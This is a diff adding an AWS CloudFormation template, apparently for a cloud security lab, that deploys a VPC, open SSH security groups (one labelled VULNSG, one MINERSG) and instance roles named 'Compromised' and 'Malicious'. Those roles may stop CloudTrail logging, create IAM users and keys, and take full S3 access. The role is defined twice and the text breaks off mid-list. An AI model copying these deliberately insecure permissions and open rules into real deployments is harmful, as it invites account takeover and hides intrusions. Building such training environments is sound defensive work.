@@ -1,0 +1,2474 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Description: >
+    This template deploys a VPC, with a pair of public and private subnets spread 
+    across two (Zone A & Zone B)  Availabilty Zones. It deploys an Internet Gateway,
+    with a default route on the public subnets. It deploy NAT Gateway (in one public AZ), 
+    and default routes for them in the private subnets.
+    
+Parameters: 
+  # EEKeyPair:
+  #   Description: "Name of the EC2 KeyPair generated for the Team"
+  #   Type: "AWS::EC2::KeyPair::KeyName"
+  LatestAWSLinuxAmiId:
+    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
+    Default: '/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2'
+  PMServerEnv:
+    Description: "Server Environment name."
+    ConstraintDescription: "Choose an Environment from the drop down"
+    Type: "String"
+    AllowedValues: 
+      - "dev"
+      - "staging"
+      - "prod"
+    Default: "dev"
+
+  PMVpcCIDR:
+    Description: "Please enter the IP range (CIDR notation) for this VPC"
+    Type: "String"
+    Default: "10.0.0.0/16"
+
+  PMPublicSubnet1CIDR:
+    Description: "Please enter the IP range (CIDR notation) for the public subnet in the first Availability Zone"
+    Type: "String"
+    Default: "10.0.1.0/24"
+
+  PMPublicSubnet2CIDR:
+    Description: "Please enter the IP range (CIDR notation) for the public subnet in the second Availability Zone"
+    Type: "String"
+    Default: "10.0.3.0/24"
+
+  PMPrivateSubnet1CIDR:
+    Description: "Please enter the IP range (CIDR notation) for the private subnet in the first Availability Zone"
+    Type: "String"
+    Default: "10.0.6.0/24"
+
+  PMPrivateSubnet2CIDR:
+    Description: "Please enter the IP range (CIDR notation) for the private subnet in the second Availability Zone"
+    Type: "String"
+    Default: "10.0.9.0/24"
+
+Mappings: 
+  # If you would like to setup Inspector in other supported regions mappings can be added below
+  # Inspector ARNs for other regions can be found here
+  # https://docs.aws.amazon.com/inspector/latest/userguide/inspector_rules-arns.html#us-east-1
+  RulePackageMap:  
+    us-east-2:
+        CVEPackage: "arn:aws:inspector:us-east-2:646659390643:rulespackage/0-JnA8Zp85"
+        CISOSBenchmarkPackage: "arn:aws:inspector:us-east-2:646659390643:rulespackage/0-m8r61nnh"
+        NetworkReachabilityPackage: "arn:aws:inspector:us-east-2:646659390643:rulespackage/0-cE4kTR30"
+        SecurityBestPracticesPackage: "arn:aws:inspector:us-east-2:646659390643:rulespackage/0-AxKmMHPX"
+    us-east-1:
+        CVEPackage: "arn:aws:inspector:us-east-1:316112463485:rulespackage/0-gEjTy7T7"
+        CISOSBenchmarkPackage: "arn:aws:inspector:us-east-1:316112463485:rulespackage/0-rExsr2X8"
+        NetworkReachabilityPackage: "arn:aws:inspector:us-east-1:316112463485:rulespackage/0-PmNV0Tcd"
+        SecurityBestPracticesPackage: "arn:aws:inspector:us-east-1:316112463485:rulespackage/0-R01qwB5Q"
+    us-west-1:
+        CVEPackage: "arn:aws:inspector:us-west-1:166987590008:rulespackage/0-TKgzoVOa"
+        CISOSBenchmarkPackage: "arn:aws:inspector:us-west-1:166987590008:rulespackage/0-xUY8iRqX"
+        NetworkReachabilityPackage: "arn:aws:inspector:us-west-1:166987590008:rulespackage/0-TxmXimXF"
+        SecurityBestPracticesPackage: "arn:aws:inspector:us-west-1:166987590008:rulespackage/0-byoQRFYm"
+    us-west-2:
+        CVEPackage: "arn:aws:inspector:us-west-2:758058086616:rulespackage/0-9hgA516p"
+        CISOSBenchmarkPackage: "arn:aws:inspector:us-west-2:758058086616:rulespackage/0-H5hpSawc"
+        NetworkReachabilityPackage: "arn:aws:inspector:us-west-2:758058086616:rulespackage/0-rD1z6dpl"
+        SecurityBestPracticesPackage: "arn:aws:inspector:us-west-2:758058086616:rulespackage/0-JJOtZiqQ"
+    ap-south-1:
+        CVEPackage: "arn:aws:inspector:ap-south-1:162588757376:rulespackage/0-LqnJE9dO"
+        CISOSBenchmarkPackage: "arn:aws:inspector:ap-south-1:162588757376:rulespackage/0-PSUlX14m"
+        NetworkReachabilityPackage: "arn:aws:inspector:ap-south-1:162588757376:rulespackage/0-YxKfjFu1"
+        SecurityBestPracticesPackage: "arn:aws:inspector:ap-south-1:162588757376:rulespackage/0-fs0IZZBj"
+    ap-northeast-2:
+        CVEPackage: "arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-PoGHMznc"
+        CISOSBenchmarkPackage: "arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-T9srhg1z"
+        NetworkReachabilityPackage: "arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-s3OmLzhL"
+        SecurityBestPracticesPackage: "arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-2WRpmi4n"
+    ap-southeast-2:
+        CVEPackage: "arn:aws:inspector:ap-southeast-2:454640832652:rulespackage/0-D5TGAxiR"
+        CISOSBenchmarkPackage: "arn:aws:inspector:ap-southeast-2:454640832652:rulespackage/0-Vkd2Vxjq"
+        NetworkReachabilityPackage: "arn:aws:inspector:ap-southeast-2:454640832652:rulespackage/0-FLcuV4Gz"
+        SecurityBestPracticesPackage: "arn:aws:inspector:ap-southeast-2:454640832652:rulespackage/0-asL6HRgN"
+    ap-northeast-1:
+        CVEPackage: "arn:aws:inspector:ap-northeast-1:406045910587:rulespackage/0-gHP9oWNT"
+        CISOSBenchmarkPackage: "arn:aws:inspector:ap-northeast-1:406045910587:rulespackage/0-7WNjqgGu"
+        NetworkReachabilityPackage: "arn:aws:inspector:ap-northeast-1:406045910587:rulespackage/0-YI95DVd7"
+        SecurityBestPracticesPackage: "arn:aws:inspector:ap-northeast-1:406045910587:rulespackage/0-bBUQnxMq"
+    eu-central-1:
+        CVEPackage: "arn:aws:inspector:eu-central-1:537503971621:rulespackage/0-wNqHa8M9"
+        CISOSBenchmarkPackage: "arn:aws:inspector:eu-central-1:537503971621:rulespackage/0-nZrAVuv8"
+        NetworkReachabilityPackage: "arn:aws:inspector:eu-central-1:537503971621:rulespackage/0-6yunpJ91"
+        SecurityBestPracticesPackage: "arn:aws:inspector:eu-central-1:537503971621:rulespackage/0-ZujVHEPB"
+    eu-west-1:
+        CVEPackage: "arn:aws:inspector:eu-west-1:357557129151:rulespackage/0-ubA5XvBh"
+        CISOSBenchmarkPackage: "arn:aws:inspector:eu-west-1:357557129151:rulespackage/0-sJBhCr0F"
+        NetworkReachabilityPackage: "arn:aws:inspector:eu-west-1:357557129151:rulespackage/0-SPzU33xe"
+        SecurityBestPracticesPackage: "arn:aws:inspector:eu-west-1:357557129151:rulespackage/0-SnojL3Z6"
+    eu-west-2:
+        CVEPackage: "arn:aws:inspector:eu-west-2:146838936955:rulespackage/0-kZGCqcE1"
+        CISOSBenchmarkPackage: "arn:aws:inspector:eu-west-2:146838936955:rulespackage/0-IeCjwf1W"
+        NetworkReachabilityPackage: "arn:aws:inspector:eu-west-2:146838936955:rulespackage/0-AizSYyNq"
+        SecurityBestPracticesPackage: "arn:aws:inspector:eu-west-2:146838936955:rulespackage/0-XApUiSaP"
+    eu-north-1:
+        CVEPackage: "arn:aws:inspector:eu-north-1:453420244670:rulespackage/0-IgdgIewd"
+        CISOSBenchmarkPackage: "arn:aws:inspector:eu-north-1:453420244670:rulespackage/0-Yn8jlX7f"
+        NetworkReachabilityPackage: "arn:aws:inspector:eu-north-1:453420244670:rulespackage/0-52Sn74uu"
+        SecurityBestPracticesPackage: "arn:aws:inspector:eu-north-1:453420244670:rulespackage/0-HfBQSbSf"
+
+Resources:
+### VPC configuration starts here
+  VPC:
+    Type: "AWS::EC2::VPC"
+    Properties:
+      CidrBlock: !Ref "PMVpcCIDR"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-MyVPC"
+
+####### Create Public Subnet #######
+  PublicSubnet1:
+    Type: "AWS::EC2::Subnet"
+    Properties:
+      VpcId: !Ref "VPC"
+      CidrBlock: !Ref "PMPublicSubnet1CIDR"
+      AvailabilityZone: !Select [ '0', !GetAZs ]
+      MapPublicIpOnLaunch: "True"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-${PMPublicSubnet1CIDR}-PublicSubnet1"
+
+  PublicSubnet2:
+    Type: "AWS::EC2::Subnet"
+    Properties:
+      VpcId: !Ref "VPC"
+      CidrBlock: !Ref "PMPublicSubnet2CIDR"
+      AvailabilityZone: !Select [ '1', !GetAZs ]
+      MapPublicIpOnLaunch: "True"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-${PMPublicSubnet2CIDR}-PublicSubnet2"
+
+######## Create Private Subnet #######
+  PrivateSubnet1:
+    Type: "AWS::EC2::Subnet"
+    Properties:
+      VpcId: !Ref "VPC"
+      CidrBlock: !Ref "PMPrivateSubnet1CIDR"
+      AvailabilityZone: !Select [ '0', !GetAZs ]
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-${PMPrivateSubnet1CIDR}-PrivateSubnet1"
+
+  PrivateSubnet2:
+    Type: "AWS::EC2::Subnet"
+    Properties:
+      VpcId: !Ref "VPC"
+      CidrBlock: !Ref "PMPrivateSubnet2CIDR"
+      AvailabilityZone: !Select [ '1', !GetAZs ]
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-${PMPrivateSubnet2CIDR}-PrivateSubnet2"
+
+######## Create Internet Gateway #######
+  MyInternetGateway:
+    Type: "AWS::EC2::InternetGateway"
+    Properties:
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-MyIGW"
+
+######## Attach Internet Gateway to VPC #######
+  GatewayToInternet:
+    Type: "AWS::EC2::VPCGatewayAttachment"
+    Properties:
+      VpcId: !Ref "VPC"
+      InternetGatewayId: !Ref "MyInternetGateway"
+
+######## Create Public Route Table #######
+  MyPublicRouteTable1:
+    Type: "AWS::EC2::RouteTable"
+    Properties:
+      VpcId: !Ref "VPC"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-MyPublicRoute1"
+
+  MyPublicRouteTable2:
+    Type: "AWS::EC2::RouteTable"
+    Properties:
+      VpcId: !Ref "VPC"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-MyPublicRoute2"
+
+######## Create Private Route Table #######
+  MyPrivateRouteTable1:
+    Type: "AWS::EC2::RouteTable"
+    Properties:
+      VpcId: !Ref "VPC"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-MyPrivateRoute1"
+
+  MyPrivateRouteTable2:
+    Type: "AWS::EC2::RouteTable"
+    Properties:
+      VpcId: !Ref "VPC"
+      Tags:
+      - Key: "Name"
+        Value: !Sub "${PMServerEnv}-MyPrivateRoute2"
+
+######## Route-out Public Route Table to Internet Gateway (Internet connection)  #######
+  MyPublicRouteIGW1:
+    Type: "AWS::EC2::Route"
+    DependsOn: "GatewayToInternet"
+    Properties:
+      RouteTableId: !Ref "MyPublicRouteTable1"
+      DestinationCidrBlock: "0.0.0.0/0"
+      GatewayId: !Ref "MyInternetGateway"
+
+  MyPublicRouteIGW2:
+    Type: "AWS::EC2::Route"
+    DependsOn: "GatewayToInternet"
+    Properties:
+      RouteTableId: !Ref "MyPublicRouteTable2"
+      DestinationCidrBlock: "0.0.0.0/0"
+      GatewayId: !Ref "MyInternetGateway"
+
+######## Associate Public Route Table with Public Subnet1 & Subnet2 #######
+  MyPublicSubnet1RouteTableAssociation:
+    Type: "AWS::EC2::SubnetRouteTableAssociation"
+    Properties:
+      SubnetId: !Ref "PublicSubnet1"
+      RouteTableId: !Ref "MyPublicRouteTable1"
+
+  MyPublicSubnet2RouteTableAssociation:
+    Type: "AWS::EC2::SubnetRouteTableAssociation"
+    Properties:
+      SubnetId: !Ref "PublicSubnet2"
+      RouteTableId: !Ref "MyPublicRouteTable2"
+
+######## Associate Private Route Table with Private Subnet1 & Subnet2 #######
+  MyPrivateSubnet1RouteTableAssociation:
+    Type: "AWS::EC2::SubnetRouteTableAssociation"
+    Properties:
+      SubnetId: !Ref "PrivateSubnet1"
+      RouteTableId: !Ref "MyPrivateRouteTable1"
+
+  MyPrivateSubnet2RouteTableAssociation:
+    Type: "AWS::EC2::SubnetRouteTableAssociation"
+    Properties:
+      SubnetId: !Ref "PrivateSubnet2"
+      RouteTableId: !Ref "MyPrivateRouteTable2"
+
+######## Create Nat Gateway in Public Subnet #######
+######## Allocate Elastic IP to Nat Gateway #######
+######## Target Private Route Table with Nat Gateway #######
+
+  MyNATGateway1EIP:
+    Type: "AWS::EC2::EIP"
+    DependsOn: "GatewayToInternet"
+    Properties:
+      Domain: "VPC"
+
+  MyNATGateway2EIP:
+    Type: "AWS::EC2::EIP"
+    DependsOn: "GatewayToInternet"
+    Properties:
+      Domain: "VPC"
+  
+  MyNATGateway1:
+    Type: "AWS::EC2::NatGateway"
+    DependsOn: "GatewayToInternet"
+    Properties:
+      AllocationId:
+        Fn::GetAtt:
+        - "MyNATGateway1EIP"
+        - "AllocationId"  
+      SubnetId: !Ref "PublicSubnet1"
+
+  MyNATGateway2:
+    Type: "AWS::EC2::NatGateway"
+    DependsOn: "GatewayToInternet"
+    Properties:
+      AllocationId:
+        Fn::GetAtt:
+        - "MyNATGateway2EIP"
+        - "AllocationId"  
+      SubnetId: !Ref "PublicSubnet2"
+
+  MyNatPrivateRoute1:
+    Type: "AWS::EC2::Route"
+    Properties:
+      RouteTableId: !Ref "MyPrivateRouteTable1"
+      DestinationCidrBlock: "0.0.0.0/0"
+      NatGatewayId: !Ref "MyNATGateway1"
+
+  MyNatPrivateRoute2:
+    Type: "AWS::EC2::Route"
+    Properties:
+      RouteTableId: !Ref "MyPrivateRouteTable2"
+      DestinationCidrBlock: "0.0.0.0/0"
+      NatGatewayId: !Ref "MyNATGateway2"
+
+######## Create Custom Network ACL #######
+  MyNetworkACL:
+    Type: "AWS::EC2::NetworkAcl"
+    Properties:
+      VpcId: !Ref "VPC"
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-MyNetworkACL"
+
+######## Associate Public Subnet to Network ACL #######
+  MyPublicSubnet1NetworkAclAssociation:
+    Type: "AWS::EC2::SubnetNetworkAclAssociation"
+    Properties:
+      SubnetId: !Ref "PublicSubnet1"
+      NetworkAclId: !Ref "MyNetworkACL"
+
+  MyPublicSubnet2NetworkAclAssociation:
+    Type: "AWS::EC2::SubnetNetworkAclAssociation"
+    Properties:
+      SubnetId: !Ref "PublicSubnet2"
+      NetworkAclId: !Ref "MyNetworkACL"
+
+######## Associate Private Subnet to Network ACL #######
+  MyPrivateSubnet1NetworkAclAssociation:
+    Type: "AWS::EC2::SubnetNetworkAclAssociation"
+    Properties:
+      SubnetId: !Ref "PrivateSubnet1"
+      NetworkAclId: !Ref "MyNetworkACL"
+
+  MyPrivateSubnet2NetworkAclAssociation:
+    Type: "AWS::EC2::SubnetNetworkAclAssociation"
+    Properties:
+      SubnetId: !Ref "PrivateSubnet2"
+      NetworkAclId: !Ref "MyNetworkACL"
+  
+  CompromisedInstanceRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/AmazonSSMFullAccess"
+      Policies: 
+        - 
+          PolicyName: MaliciousInstancePolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action: 'ssm:*'
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - ec2:CreateTags
+                  - ec2:RunInstances
+                  - ec2:DescribeInstances
+                  - ec2:DescribeTags
+                  - ec2:CreateTags
+                  - ec2:DescribeInstances
+                  - ec2:DescribeTags
+                  - ec2:DescribeSnapshots
+                  - ec2:DescribeVolumes
+                  - iam:ListAccountAliases
+                  - cloudtrail:DescribeTrails
+                  - cloudwatch:DescribeAlarms
+                  - config:DescribeConfigRules
+                  - guardduty:ListDetectors 
+                  - iam:ListAccessKeys
+                  - iam:CreateUser
+                  - iam:CreateAccessKey
+                  - iam:DeleteAccessKey
+                  - iam:AttachUserPolicy 
+                  - cloudtrail:StopLogging
+                  - iam:GetCredentialReport
+                  - secretsmanager:CreateSecret
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - logs:PutLogEvents
+                  - logs:DescribeLogStreams
+                  - logs:CreateLogStream
+                  - logs:CreateLogGroup
+                Resource: '*'
+              - 
+                Effect: Allow
+                Action: 
+                  - 's3:*'
+                Resource: "*"
+### VPC configuration ends here
+
+### Network Security configuration resources begin here
+  MaliciousInstanceRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/AmazonSSMFullAccess"
+      Policies: 
+        - 
+          PolicyName: MaliciousInstancePolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action: 'ssm:*'
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - ec2:CreateTags
+                  - ec2:RunInstances
+                  - ec2:DescribeInstances
+                  - ec2:DescribeTags
+                  - ec2:DescribeSnapshots
+                  - ec2:DescribeVolumes
+                  - rds:DescribeDBInstances
+                  - rds:DescribeDBInstances
+                  - rds:DescribeDBSecurityGroups
+                  - ec2:DescribeSecurityGroups
+                  - iam:ListAccountAliases
+                  - cloudtrail:DescribeTrails
+                  - cloudwatch:DescribeAlarms
+                  - config:DescribeConfigRules
+                  - guardduty:ListDetectors 
+                  - iam:ListAccessKeys
+                  - iam:CreateUser
+                  - cloudtrail:StopLogging
+                  - iam:GetCredentialReport
+                  - iam:AttachUserPolicy
+                  - servicequotas:ListServiceQuotas
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - logs:PutLogEvents
+                  - logs:DescribeLogStreams
+                  - logs:CreateLogStream
+                  - logs:CreateLogGroup
+                Resource: '*'
+              - 
+                Effect: Allow
+                Action: "s3:*"
+                Resource: "*"
+   
+  ProxyHostSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties: 
+      VpcId: !Ref VPC
+      GroupDescription: "Web Server Security Group"
+      SecurityGroupIngress:
+        - CidrIp: "0.0.0.0/0"
+          FromPort: "22"   
+          IpProtocol: "tcp"
+          ToPort: "22"
+        - FromPort: "443"
+          IpProtocol: "tcp"
+          SourceSecurityGroupId:
+            Ref: "WEBELBSG"
+          ToPort: "443"
+        - FromPort: "80"
+          IpProtocol: "tcp"
+          SourceSecurityGroupId:
+            Ref: "WEBELBSG"
+          ToPort: "80"
+      SecurityGroupEgress:
+        - IpProtocol: '-1'
+          CidrIp: '0.0.0.0/0'
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-ProxyHostSG"
+
+  # Web Proxy Server Elastic Load Balancer
+  WEBELBSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties:
+      GroupDescription: "ELB-WEBSG"
+      SecurityGroupEgress:
+      - IpProtocol: "-1"
+        CidrIp: "0.0.0.0/0"
+      SecurityGroupIngress:
+      - IpProtocol: 'icmp'
+        FromPort: '-1'
+        ToPort: '-1'
+        CidrIp: '0.0.0.0/0'
+      # - CidrIp: "0.0.0.0/0"
+      #   FromPort: "80"
+      #   IpProtocol: "tcp"
+      #   ToPort: "80"
+      # - CidrIp: "0.0.0.0/0"
+      #   FromPort: "443"
+      #   IpProtocol: "tcp"
+      #   ToPort: "443"
+      # - CidrIp: "0.0.0.0/0"
+      #   FromPort: "22"
+      #   IpProtocol: "tcp"
+      #   ToPort: "22"
+      VpcId: !Ref VPC
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-WEBELBSG"
+
+  VULNSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties:
+      GroupDescription: "VULNSG"
+      # SecurityGroupEgress:
+      # - IpProtocol: "-1"
+      #   CidrIp: "0.0.0.0/0"
+      SecurityGroupIngress:
+        - CidrIp: "0.0.0.0/0"
+          FromPort: "22"
+          IpProtocol: "tcp"
+          ToPort: "22"
+      VpcId: !Ref VPC
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-VULNSG"
+
+  MINERSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties:
+      GroupDescription: "MINERSG"
+      SecurityGroupEgress:
+      - IpProtocol: "-1"
+        CidrIp: "0.0.0.0/0"
+      VpcId: !Ref VPC
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-MINERSG"
+
+  # App Server Security Group
+  # PHP-fpm (port 9000)
+  APPHostSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties: 
+      VpcId: !Ref VPC
+      GroupDescription: "Application Server Security Group"
+      SecurityGroupIngress:
+        # This is private subnet, so you can only able to ssh once you're inside 
+        # the public subnet host (E.g. Bastion Host).
+        - CidrIp: "0.0.0.0/0"
+          FromPort: "22"
+          IpProtocol: "tcp"
+          ToPort: "22"
+        - FromPort: "9000"
+          IpProtocol: "tcp"
+          SourceSecurityGroupId:
+            Ref: "APPELBSG"
+          ToPort: "9000"
+      SecurityGroupEgress:
+        - IpProtocol: '-1'
+          CidrIp: '0.0.0.0/0'
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-APPHostSG"
+
+  # AppServer Elastic Load Balancer
+  APPELBSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties:
+      GroupDescription: "ELB-APPSG"
+      SecurityGroupEgress:
+      - IpProtocol: "-1"
+        CidrIp: "0.0.0.0/0"
+      SecurityGroupIngress:
+        - FromPort: "9000"
+          IpProtocol: "tcp"
+          SourceSecurityGroupId:
+            Ref: "ProxyHostSG"
+          ToPort: "9000"
+      VpcId: !Ref VPC
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-APPELBSG"
+
+  # Allow RDS connection from ProxyHostSG only.
+  RDSSG:
+    Type: "AWS::EC2::SecurityGroup"
+    Properties:
+      GroupDescription: "Security group for RDS DB Instance."
+      SecurityGroupEgress:
+      - IpProtocol: "-1"
+        CidrIp: "0.0.0.0/0"
+      SecurityGroupIngress:
+      - FromPort: "3306"
+        IpProtocol: "tcp"
+        SourceSecurityGroupId:
+          Ref: "ProxyHostSG"
+        ToPort: "3306"
+      VpcId: !Ref VPC
+      Tags:
+        - Key: "Name"
+          Value: !Sub "${PMServerEnv}-RDSSG"
+
+  #####################################################################################
+  # Additional Firewall Protection (inbound and outbound traffic at the subnet level)
+  ####### INBOUND HTTP Network ACL RULES ##############################################
+  InboundHTTPNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '100'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "false"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '80'
+        To: '80'
+
+  # ####### INBOUND HTTPS Network ACL RULES #######
+  InboundHTTPSNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '200'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "false"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '443'
+        To: '443'
+
+  # ####### INBOUND SSH Network ACL RULES #######
+  InboundSSHNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '300'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "false"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '22'
+        To: '22'
+
+  # ####### INBOUND Ephemeral Ports Network ACL RULES #######
+  InboundEPHNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '400'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "false"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '1024'
+        To: '65535'
+
+  # ####### INBOUND ICMP Network ACL RULES #######
+  InboundICMPNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '500'
+      Protocol: "1"
+      RuleAction: "allow"
+      Egress: "false"
+      CidrBlock: "0.0.0.0/0"
+      Icmp:
+        Code: "-1"
+        Type: "-1"
+
+  # ####### OUTBOUND HTTP Network ACL RULES #######
+  OutboundHTTPNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '100'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "true"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '80'
+        To: '80'
+
+  # ####### OUTBOUND HTTPS Network ACL RULES #######
+  OutboundHTTPSNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '200'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "true"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '443'
+        To: '443'
+
+  # ####### OUTBOUND SSH Network ACL RULES #######
+  OutboundSSHNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '300'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "true"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '22'
+        To: '22'
+
+  # ####### OUTBOUND Ephemeral Ports Network ACL RULES #######
+  OutboundEPHNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '400'
+      Protocol: "6"
+      RuleAction: "allow"
+      Egress: "true"
+      CidrBlock: "0.0.0.0/0"
+      PortRange:
+        From: '1024'
+        To: '65535'
+
+  # ####### OUTBOUND ICMP Network ACL RULES #######
+  OutboundICMPNACL:
+    Type: "AWS::EC2::NetworkAclEntry"
+    Properties:
+      NetworkAclId: !Ref MyNetworkACL
+      RuleNumber: '500'
+      Protocol: "1"
+      RuleAction: "allow"
+      Egress: "true"
+      CidrBlock: "0.0.0.0/0"
+      Icmp:
+        Code: "-1"
+        Type: "-1"
+  
+  IsolateEc2SecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Limits security group egress traffic
+      SecurityGroupEgress:
+      - CidrIp: 127.0.0.1/32
+        IpProtocol: "-1"
+      VpcId: !Ref VPC
+
+  EnrichSecHubRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Principal:
+            Service:
+            - lambda.amazonaws.com
+          Action:
+          - sts:AssumeRole
+      Path: "/"
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+        - arn:aws:iam::aws:policy/AWSSecurityHubFullAccess
+        - arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess
+
+  IsolateEc2LambdaRole:
+      Type: AWS::IAM::Role
+      Properties:
+        AssumeRolePolicyDocument:
+          Version: '2012-10-17'
+          Statement:
+          - Effect: Allow
+            Principal:
+              Service:
+              - lambda.amazonaws.com
+            Action:
+            - sts:AssumeRole
+        Path: "/"
+        Policies:
+        - PolicyName: IsolateEC2LamdaRolePolicy
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement: 
+            - Effect: Allow
+              Action:
+              - logs:*
+              Resource: arn:aws:logs:*:*:*
+            - Effect: Allow
+              Action:
+              - ec2:ModifyInstanceAttribute
+              - ec2:DescribeInstances
+              Resource: "*"
+
+  GenericLambdaRole:
+    Type: "AWS::IAM::Role"
+    Properties: 
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Principal:
+            Service:
+            - lambda.amazonaws.com
+          Action:
+          - sts:AssumeRole
+      Policies:
+      - PolicyName: lambdaPolicy
+        PolicyDocument:
+          Statement:
+          - Effect: Allow
+            Action:
+            - logs:CreateLogGroup
+            - logs:CreateLogStream
+            - logs:PutLogEvents
+            - logs:DescribeLogStreams
+            Resource: "*"
+          - Effect: Allow
+            Action:
+            - s3:*
+            Resource: "*"
+          - Effect: Allow
+            Action:
+            - iam:PassRole
+            - sts:AssumeRole
+            Resource: "*"
+  ### Network security configuration resources end here
+  
+  ### Server configuration begins here
+
+  MaliciousInstanceRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/AmazonSSMFullAccess"
+      Policies: 
+        - 
+          PolicyName: MaliciousInstancePolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action: 'ssm:*'
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - ec2:CreateTags
+                  - ec2:RunInstances
+                  - ec2:DescribeInstances
+                  - ec2:DescribeTags
+                  - ec2:CreateTags
+                  - ec2:RunInstances
+                  - ec2:DescribeInstances
+                  - ec2:DescribeTags
+                  - ec2:DescribeSnapshots
+                  - ec2:DescribeVolumes
+                  - rds:DescribeDBInstances
+                  - rds:DescribeDBInstances
